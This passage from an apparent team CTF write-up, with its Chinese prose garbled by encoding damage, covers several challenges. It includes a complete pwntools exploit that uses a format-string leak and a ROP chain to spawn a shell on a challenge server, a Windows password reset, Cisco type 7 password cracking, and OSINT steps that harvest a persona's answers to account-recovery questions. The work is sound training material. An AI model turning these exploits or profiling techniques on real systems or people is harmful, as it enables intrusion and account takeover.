<p>æ”¹å®Œä¹‹å¾Œå°±å¯ä»¥é€²å…¥é€™å€‹functionäº†<br><img src="https://hackmd.io/_uploads/Hyr7fGA_0.png" alt="image"><br>æ¥è‘—åˆ©ç”¨å‰›å‰›leakå‡ºä¾†çš„æ±è¥¿åšone gadget(with rop)å°±å¥½äº†<br>payload:<br><code>padding|canary|pop r12; ret|0|pop r15; ret|0|one_gadget</code><br>æˆ‘é¸çš„one gadget:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br></pre></td></tr></table></figure>

<p>script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = &quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"><span class="comment">#r = process(&quot;./imgstore&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;imgstore.chal.imaginaryctf.org&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fsb</span>(<span class="params">payload</span>):    </span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Enter book title: &quot;</span>, payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Book title --&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#get rsp + 8, canary, libcbase</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(fsb(<span class="string">&quot;%15$p&quot;</span>), base=<span class="number">16</span>) - <span class="number">120</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(fsb(<span class="string">&quot;%17$p&quot;</span>), base=<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(fsb(<span class="string">&quot;%13$p&quot;</span>), base=<span class="number">16</span>) - <span class="number">0x84420</span> - <span class="number">378</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#modify rsp+8 to 0x8c87dec5</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(addr % <span class="number">0x10000</span>, <span class="number">15</span>).encode()</span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xdec5</span>, <span class="number">22</span>).encode()</span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>((addr + <span class="number">2</span>) % <span class="number">0x10000</span>, <span class="number">15</span>).encode()</span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[y/n]: &quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x8c87</span>, <span class="number">22</span>).encode()</span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP -&gt; padding|canary|pop r12; ret|0|pop r15; ret|0|one_gadget</span></span><br><span class="line">pop_r12_ret = libcbase + <span class="number">0x2f709</span> </span><br><span class="line">pop_r15_ret = libcbase + <span class="number">0x23b69</span> </span><br><span class="line">one_gadget = libcbase + <span class="number">0xe3afe</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_r12_ret))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_r15_ret))</span><br><span class="line">rop = pack(pop_r12_ret, <span class="number">64</span>) + pack(<span class="number">0</span>, <span class="number">64</span>) + pack(pop_r15_ret, <span class="number">64</span>) + pack(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">8</span> + pack(canary, <span class="number">64</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + rop + pack(one_gadget, <span class="number">64</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;UNDER DEVELOPMENT &quot;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><ul>
<li>solver Whale120</li>
</ul>
<h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>æ‹¿åˆ°ä¸€å€‹vmemæª”æ¡ˆï¼Œç”¨volatilityé€²è¡Œæƒæ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f dump.vmem kdbgscan</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B1ic67Yu0.png" alt="image"></p>
<p><strong>filescan</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f dump.vmem --profile=Win10x64_19041 filescan | grep flag</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HymYpmtuR.png" alt="image"></p>
<p>æ‹¿åˆ°è™›æ“¬åœ°å€å¾Œï¼Œç”¨filedumpå€’å‡ºï¼š  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vol.py -f dump.vmem -o flag  windows.dumpfiles --virtaddr 0xc60c81c70ce0</span><br></pre></td></tr></table></figure>

<p>æœ€å¾Œåˆ‡å»flagç›®éŒ„catå‡ºä¾†æœƒè®Šæˆbase64, decodeä¸€ä¸‹å°±å¥½ã„Œ~<br><img src="https://hackmd.io/_uploads/BkYyC7F_A.png" alt="image">  </p>
<h3 id="bom"><a href="#bom" class="headerlink" title="bom"></a>bom</h3><ul>
<li>solver ChiLin.H<blockquote>
<p><a target="_blank" rel="noopener" href="https://cybersharing.net/s/e964ad1143538987">https://cybersharing.net/s/e964ad1143538987</a></p>
</blockquote>
</li>
</ul>
<p>æ”¹ç·¨ç¢¼ï¼Œä½†æˆ‘ç›¸ä¿¡ä»–å€‘è¢«é›²ç«¯ç©ºé–“è³£äº†ã€‚<br><img src="https://hackmd.io/_uploads/SJMqD1YuA.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkbeFyFOC.png" alt="image"><br>Flag: <code>ictf&#123;th4t_isn7_chin3se&#125;</code></p>
<h3 id="packed"><a href="#packed" class="headerlink" title="packed"></a>packed</h3><ul>
<li>solver ChiLin.H</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cybersharing.net/s/266989fb9d6c56b1">https://cybersharing.net/s/266989fb9d6c56b1</a></p>
</blockquote>
<ol>
<li>çµ¦äº†å€‹ <code>routed.pkz</code></li>
<li>ç”¨ 7zip ç²—çˆ†åœ°é‘½é€²ä»–é«”å…§<br><img src="https://hackmd.io/_uploads/SyETDyFdA.png" alt="image"></li>
<li>ç”¨åŠ›åœ°æ‰“é–‹ä»–é«”å…§çš„ <code>secret.png</code><br><img src="https://hackmd.io/_uploads/HkmRPJKuC.png" alt="image"></li>
<li>Flag: <code>ictf&#123;ab4697882634d4aeb6f21141ea2724d0&#125;</code></li>
</ol>
<h3 id="routed"><a href="#routed" class="headerlink" title="routed"></a>routed</h3><ul>
<li>solver Whale120<br>ç‚ºpackedçš„å»¶çºŒï¼Œè¦å°routed.pktä½œåˆ†æï¼Œåˆ©ç”¨Cisco Packet Traceræ‰“é–‹ï¼Œæœƒçœ‹åˆ°å¹¾å°å¯æ„›çš„æ©Ÿå™¨ï¼š<br><img src="https://hackmd.io/_uploads/H1UsN_9_C.png" alt="image"><br>View Command<br><img src="https://hackmd.io/_uploads/r1C34dq_R.png" alt="image"><br>æŒ–åˆ°ä¸€å¨å‡flag<br><img src="https://hackmd.io/_uploads/ry87Bu9uR.png" alt="image"></li>
</ul>
<p>ç¿»äº†ä¸€ä¸‹æ‰¾åˆ°type 7 passwordï¼Œä¸Šç¶²æœä¸€ä¸‹æ‰¾åˆ°<a target="_blank" rel="noopener" href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">decrypt tool(link)</a>ï¼š<br><img src="https://hackmd.io/_uploads/Syj-HuqOA.png" alt="image"></p>
<h3 id="cartesian-1"><a href="#cartesian-1" class="headerlink" title="cartesian-1"></a>cartesian-1</h3><ul>
<li>solver Elliot_404<br>ä¸ŠInstagramæœå°‹Terrence Descartes<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.instagram.com/descartes.terry2001/">https://www.instagram.com/descartes.terry2001/</a></p>
</blockquote>
</li>
</ul>
<p>åœ¨é™æ™‚å‹•æ…‹ä¸­ç™¼ç¾flag<br><img src="https://hackmd.io/_uploads/BJCXeZFO0.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-07-20 171424"></p>
<h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
<li>solver Elliot_404<br>ä¸ŠLinkedInæœå°‹Terrence Descartesï¼Œæœƒçœ‹åˆ°ä¸€å€‹è·Ÿå‰é¢Instagramå¸³è™ŸåŒæ¨£é ­åƒçš„ï¼Œé»ä¸‹å»<br><a target="_blank" rel="noopener" href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>æŸ¥çœ‹ç¬¬ä¸€å‰‡è²¼æ–‡çš„ç¬¬äºŒå¼µç…§ç‰‡ï¼Œè£¡é¢æœ‰å¯«flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
</ul>
<p>åˆ©ç”¨<a target="_blank" rel="noopener" href="https://epieos.com/">epieos</a>æœå°‹<a href="mailto:&#116;&#x65;&#x72;&#114;&#x65;&#110;&#99;&#x65;&#100;&#x65;&#115;&#99;&#x61;&#x72;&#x74;&#101;&#x73;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#116;&#x65;&#x72;&#114;&#x65;&#110;&#99;&#x65;&#100;&#x65;&#115;&#99;&#x61;&#x72;&#x74;&#101;&#x73;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>(ç”¨å§“åçŒœå‡ºä¾†çš„)<br>Google Calendarå³é‚Šçš„é€£çµé»é€²å»<br><a target="_blank" rel="noopener" href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>é¡Œç›®èªªè¦è§€å¯Ÿä»–å»å¹´å¤å¤©æ—…è¡Œï¼Œæ‰€ä»¥å‰å¾€2023å¹´6æœˆï¼Œæœƒçœ‹åˆ°SUMMER TRIP!!!ï¼Œé»ä¸‹å»å°±èƒ½çœ‹åˆ°flag(2&#x2F;2)äº†<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
<h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
<li>solver Elliot_404<blockquote>
<p><a target="_blank" rel="noopener" href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
</blockquote>
</li>
</ul>
<ol>
<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#114;&#114;&#101;&#110;&#x63;&#x65;&#100;&#x65;&#115;&#x63;&#97;&#114;&#116;&#x65;&#115;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#116;&#x65;&#114;&#114;&#101;&#110;&#x63;&#x65;&#100;&#x65;&#115;&#x63;&#97;&#114;&#116;&#x65;&#115;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;</a><br>ç”¨å§“åå»çŒœå³å¯</p>
</li>
<li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>æ­¤ç¯‡<a target="_blank" rel="noopener" href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagramè²¼æ–‡</a>æ˜¯ä»–çš„åŠæ­²ç”Ÿæ—¥æ…¶ç¥æ–‡ï¼Œç”¨ç™¼æ–‡æ—¥æœŸæ¸›å»6å€‹æœˆå¾Œå³æ˜¯ä»–çš„ç”Ÿæ—¥ï¼Œå¹´ä»½çš„éƒ¨åˆ†å‰‡åœ¨åç¨±ä¸­å°±é€éœ²äº†</p>
</li>
<li><p>What is the name of your favorite pet?<br>A: bonnie<br>é€™ç¯‡<a target="_blank" rel="noopener" href="https://www.instagram.com/p/C9llEYxxl5x/">Instagramè²¼æ–‡</a>å¯«çš„</p>
</li>
<li><p>What city have you primarily lived in for the past three months?<br>A: San Diego<br>é€™ç¯‡<a target="_blank" rel="noopener" href="https://www.instagram.com/p/C9lmMxHRRrU/?img_index=1">Instagramè²¼æ–‡</a>å¯«èªªå‰›å¾å­¸æ ¡å›åˆ°å®¶ï¼Œä»£è¡¨éå»3å€‹æœˆæ‡‰è©²éƒ½åœ¨å­¸æ ¡é™„è¿‘ç”Ÿæ´»ï¼Œè€ŒInstagramè‡ªæˆ‘ä»‹ç´¹é€éœ²å‡ºå­¸æ ¡æ˜¯UCSDï¼Œæœå°‹å¾Œç™¼ç¾åœ¨San Diego<br><img src="https://hackmd.io/_uploads/HyI5VcsOR.png" alt="image"></p>
</li>
<li><p>In what city did you grow up?<br>A: Phoenix<br>æ ¹æ“šéšŠå‹æä¾›çš„ç·šç´¢ä»–çš„å®¶é„‰èˆ‡å„é»è·é›¢<br>Home<strong>â†”ï¸</strong>NYC:2139è‹±é‡Œ<br><img src="https://hackmd.io/_uploads/H16JcYodC.png" alt="image (5)"><br>Home<strong>â†”ï¸</strong>è¥¿é›…åœ–:1114è‹±é‡Œ<br><img src="https://hackmd.io/_uploads/SklMcto_0.png" alt="Screenshot_20240722-020245 (1)"><br>Home<strong>â†”ï¸</strong>å­¸æ ¡UCSD:300è‹±é‡Œ<br><img src="https://hackmd.io/_uploads/B1c37coO0.png" alt="image"></p>
</li>
</ol>
<p>ä½†æ‰¾ä¸åˆ°é©åˆçš„å·¥å…·ä¾†ä¸‰é»å®šä½ï¼Œæ–¼æ˜¯æ‰“é–‹googleåœ°çƒï¼Œç©äº†ä¸€ä¸‹é‡æ¸¬ç™¼ç¾æ˜¯å–®ä½æ˜¯<strong>å…¬å°º</strong>ï¼Œé€éChatGPTå…ˆæŠŠéšŠå‹æä¾›çš„ç·šç´¢è½‰æ›æˆå…¬å°ºã€‚<br><img src="https://hackmd.io/_uploads/HkEUoKiOC.png" alt="meter"><br>é¦–å…ˆé»ç´ç´„å¸‚æ‹‰ä¸€æ¢ç´„3436000å…¬å°ºçš„ç·š(å¤§æ¦‚å°±å¥½ä¸ç”¨å¤ªæº–åªæ˜¯ç”¨ä¾†æ‰¾æ–¹å‘çš„)<br><img src="https://hackmd.io/_uploads/B14TCtjdC.png" alt="image (6)"><br>ç„¶å¾Œæœå°‹UCSDï¼Œå¾UCSDæ‹‰ä¸€æ¢å¤§æ¦‚æ¥è¿‘1787000å…¬å°ºå¤šçš„ç·šï¼Œå€åŸŸæ‡‰è©²æ˜¯åœ¨äºåˆ©æ¡‘é‚£å·ï¼Œè€Œä¸”é³³å‡°åŸå¾ˆé è¿‘é‡æ¸¬é»ï¼Œæ‰€ä»¥çŒœæ¸¬æ˜¯é³³å‡°åŸã€‚<br><img src="https://hackmd.io/_uploads/ryMRAKi_0.png" alt="USD"><br>æœ€å¾Œå¾è¥¿é›…åœ–é‚£å€‹é»æ‹‰ä¸€æ¢482000mçš„ç·šï¼Œç¢ºå¯¦åœ¨äºåˆ©æ¡‘é‚£å·ç¯„åœå…§ï¼Œæ¥è‘—æ‰¾å‡ºè·é›¢æœ€æ¥è¿‘1,787,065mä½ç½®çš„åŸå¸‚ï¼Œçœ‹äº†ä¸€ä¸‹é³³å‡°åŸï¼ŒæŠŠé‡æ¸¬é»æ‹‰éå»é©—è­‰ï¼Œç¬¦åˆçŒœæ¸¬ã€‚<br><img src="https://hackmd.io/_uploads/rJAA0Ko_0.png" alt="USD1"></p>
<ol start="6">
<li><p>What is the name of your favorite poet?<br>A: Robert Frost<br>å¾ä»–Instagramå¸³æˆ¶è¿½è¹¤çš„å°è±¡çœ‹å‡ºä¾†çš„ï¼Œæ¯å€‹éƒ½è·ŸRobert Frostæœ‰é—œ<br><img src="https://hackmd.io/_uploads/SJo9-5juA.png" alt="image"></p>
</li>
<li><p>What was the make and model of your first car?<br>A: Honda Civic<br>é€™ç¯‡<a target="_blank" rel="noopener" href="https://www.instagram.com/p/C9lmMxHRRrU/?img_index=1">Instagramè²¼æ–‡</a>æœ€å¾Œæœ‰å¯« #firstcarï¼Œå°åœ–ç‰‡ä½¿ç”¨googleæ™ºæ…§é¡é ­å³å¯æœå°‹å‡ºè»Šæ¬¾<br><img src="https://hackmd.io/_uploads/rkwMx9jd0.png" alt="image"></p>
</li>
<li><p>In what year was your father born?<br>A: 1981<br>ä¸Šgithubæœå°‹terrence descartesåªèƒ½æ‰¾æ‰¾åˆ°ä¸€å€‹<a target="_blank" rel="noopener" href="https://github.com/descartes1337">å¸³æˆ¶</a>ï¼ŒæŸ¥çœ‹ä»–å”¯ä¸€çš„å°ˆæ¡ˆçš„commitsè£¡çš„<a target="_blank" rel="noopener" href="https://github.com/descartes1337/birthday-card/commit/e6f565a35fd10136647336780731a4d19aabfac7">redact sensitive info</a>æœƒç™¼ç¾ä»–çˆ¸43æ­²ï¼Œ2024-43&#x3D;1981<br><img src="https://hackmd.io/_uploads/H118gciOA.png" alt="image"></p>
</li>
<li><p>What is your motherâ€™s maiden name?<br>A: Jackson<br><img src="https://hackmd.io/_uploads/ryJhgcodA.png" alt="image"><br>å¾æ­¤ç¯‡<a target="_blank" rel="noopener" href="https://www.linkedin.com/feed/update/urn:li:activity:7219899411361882112/">LinkedInè²¼æ–‡</a>ä¸­å¾—çŸ¥å¥¹åª½åª½å§“åç‚ºAmelia Jackson Descartesï¼Œæ ¹æ“šç¾åœ‹å† å¤«å§“çš„æ–¹å¼ï¼ŒæœƒæŠŠå¤«å§“æ”¾å¾Œé¢ï¼Œå¼•æ­¤å©šå‰å§“æ°ç‚ºJackson<br>å¯¦éš›ğŸŒ°:æ‹œç™»çš„å‰ä»»å¤ªå¤ª,å…§è‰äºÂ·æ­ç‰¹Â·æ‹œç™»ï¼ˆè‹±èªï¼šNeilia Hunter Bidenï¼‰ï¼›å©šå‰å§“æ­ç‰¹ï¼ˆè‹±èªï¼šHunterï¼‰</p>
</li>
<li><p>At what company do you work at?<br>A: Cohort Calculations<br>ä»–çš„LinkedInå¯«çš„ï¼š<br><img src="https://hackmd.io/_uploads/SyQQ3KjuA.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-07-22 153643"></p>
</li>
<li><p>In what city did you go on vacation last summer?<br>A: Saint Paul<br><img src="https://hackmd.io/_uploads/SkU03YoO0.png" alt="image"><br>æœå°‹<a target="_blank" rel="noopener" href="https://www.linkedin.com/feed/update/urn:li:activity:7220221551969759232/">æ­¤è²¼æ–‡</a>ç¬¬äºŒå¼µåœ–ç‰‡å·¦ä¸Šè§’çš„åœ°é»çš„æ‰€åœ¨åœ°å³å¯å¾—çŸ¥ç­”æ¡ˆ</p>
</li>
<li><p>What are you supposed to do on August 21?<br>A: Drop off top secret information<br>åœ¨ä»–çš„googleæ—¥æ›†ä¸­å¯Ÿçœ‹8&#x2F;21æ—¥çš„è¡Œç¨‹å³å¯å¾—çŸ¥ç­”æ¡ˆ<br><img src="https://hackmd.io/_uploads/H1CQ0tjOR.png" alt="image"></p>
</li>
<li><p>Who was your boss in your first job?<br>A: Farmer Johnson<br>åœ¨ä»–çš„LinkedInä¸­å¯«çš„ç¬¬ä¸€ä»½å·¥ä½œçš„å…¬å¸åç¨±çš„ä¸€éƒ¨åˆ†å³æ˜¯ç­”æ¡ˆ<br><img src="https://hackmd.io/_uploads/Byp30Ksd0.png" alt="image"><br>æœ€å¾Œå¡«å®Œæ‰€æœ‰è³‡æ–™æŒ‰ä¸‹<strong>submit</strong>å°±æœƒè·³åˆ°flagé é¢<br><img src="https://hackmd.io/_uploads/HkpDlciOR.png" alt="flag"></p>
</li>
</ol>
<h3 id="dog-mom"><a href="#dog-mom" class="headerlink" title="dog-mom"></a>dog-mom</h3><ul>
<li>solver Elliot_404<blockquote>
<p><a target="_blank" rel="noopener" href="https://cybersharing.net/s/4f1dbcbb01b5f98d">https://cybersharing.net/s/4f1dbcbb01b5f98d</a></p>
</blockquote>
</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HyeAR9i_C.jpg" alt="image (3)"></p>
<p>æœå°‹åœ–ç‰‡å…¶ä¸­ä¸€å€‹åœ°æ–¹å¾Œgoogleè¾¨è­˜å‡ºåœ°é»äº†<br><img src="https://hackmd.io/_uploads/SJL6PqoOR.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-07-22 162256 (1)"></p>
<p>æ¥è‘—åœ¨googleåœ°çƒä¸Šæœå°‹æ­¤åœ°é»å¾Œç¨å¾®é€›ä¸€ä¸‹é™„è¿‘å³å¯æ‰¾åˆ°é¡Œç›®åœ–ç‰‡å·¦ä¸‹æ–¹çš„åœ°é»<br><img src="https://hackmd.io/_uploads/HJVw5cj_R.png" alt="è¢å¹•æ“·å–ç•«é¢ 2024-07-22 163540"></p>
<p>æ ¹æ“šæ‹æ”è§’åº¦ä¾†çœ‹æ‡‰è©²æ˜¯åœ¨æœ‰ä¸€å®šé«˜åº¦çš„åœ°æ–¹æ‹çš„ï¼Œå¤§æ¦‚ç‡æ˜¯åœ¨å­¸ç¿’å¤§æ•™å ‚ä¸Š<br><img src="https://hackmd.io/_uploads/SJaeRcoO0.jpg" alt="dog mon 2"></p>
<p>ç›¡å¯èƒ½é‚„åŸæ‹æ”è§’åº¦äº†XD<br><img src="https://hackmd.io/_uploads/SJfOaqouC.jpg" alt="dog mon"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ul>
<li>solver ChiLin.H</li>
</ul>
<h3 id="sanity-check"><a href="#sanity-check" class="headerlink" title="sanity-check"></a>sanity-check</h3><p><img src="https://hackmd.io/_uploads/Bywiv1K_A.png" alt="image"><br>Flag: <code>ictf&#123;this_isnt_real&#125;</code></p>
<h3 id="discord"><a href="#discord" class="headerlink" title="discord"></a>discord</h3><ul>
<li>solver ChiLin.H<br><img src="https://hackmd.io/_uploads/HJe2PJtOR.png" alt="image"><br><del>DC URL å¾ˆæœƒæ¶</del><br><img src="https://hackmd.io/_uploads/HknnvyKOC.png" alt="image"><blockquote>
<p><a target="_blank" rel="noopener" href="https://discord.com/channels/732308165265326080/1262522411123736718/1262528560904667239">https://discord.com/channels/732308165265326080/1262522411123736718/1262528560904667239</a></p>
</blockquote>
</li>
</ul>
<p>Flag: <code>ictf&#123;fake_flag_for_testing&#125;</code></p>
<h3 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h3><ul>
<li>solver ChiLin.H<br><img src="https://hackmd.io/_uploads/Byb9U_Kd0.png" alt="image"></li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://storage.googleapis.com/ictf-2024-files/Locked.7z">https://storage.googleapis.com/ictf-2024-files/Locked.7z</a></p>
</blockquote>
<ol>
<li>è¼‰ä¸‹ä¾†ï¼Œç™¼ç¾æª”æ¡ˆæ˜¯ä¸€å°è™›æ“¬æ©Ÿçš„æª”æ¡ˆã€‚<br><img src="https://hackmd.io/_uploads/S1fpIdYuC.png" alt="image"></li>
<li>ç”¨è™›æ“¬æ©Ÿæ‰“é–‹ï¼Œç™¼ç¾æ˜¯å€‹ Windows 10 (ia32)ï¼Œç„¶å¾Œæœ‰å¯†ç¢¼é€²ä¸å»<br><img src="https://hackmd.io/_uploads/ryiWuut_A.png" alt="image"></li>
<li>æ‹¿å‡ºç¥–å‚³çš„ USBOX WinPEï¼Œæ‰“é–‹ NTPWEditï¼Œæ”¹æ‰ä»–çš„å¯†ç¢¼<br><img src="https://hackmd.io/_uploads/BkFu_uKOC.jpg" alt="image (1)"></li>
<li>é‡é–‹æ©Ÿå¾Œï¼Œç”¨æ”¹æ‰çš„å¯†ç¢¼ç™»éŒ„<br><img src="https://hackmd.io/_uploads/H1D5uuY_C.png" alt="image"><br>Flag: <code>ictf&#123;97ce0dee87d38c7bb4&#125;</code></li>
</ol>
<h3 id="sussy"><a href="#sussy" class="headerlink" title="sussy"></a>sussy</h3><ul>
<li>solver ChiLin.H</li>
</ul>
<ol>
<li>æ‰¾åˆ°ä»–çš„ DC æ©Ÿå™¨äºº <a target="_blank" rel="noopener" href="https://discordapp.com/users/1262915653455708231">@amogusbot#3035</a></li>
<li>äº‚è©¦</li>
<li>é€å‡º <code>!inventory &lt;@1262915653455708231&gt; @flag</code></li>
<li>æ©Ÿå™¨äººå›è¦† <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;@1262915653455708231&gt; has 0 @flag amogi.|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| &lt;@485801570462859265&gt;ictf&#123;$p0!l3rsp@m!!_809129783&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>Flag: <code>ictf&#123;$p0!l3rsp@m!!_809129783&#125;</code><br>è¨»ï¼šå¾Œé¢çš„ <code>@flag</code> å¯æ›¿æ›ä»»æ„å­—å…ƒ</p>
<h3 id="starship"><a href="#starship" class="headerlink" title="starship"></a>starship</h3><ul>
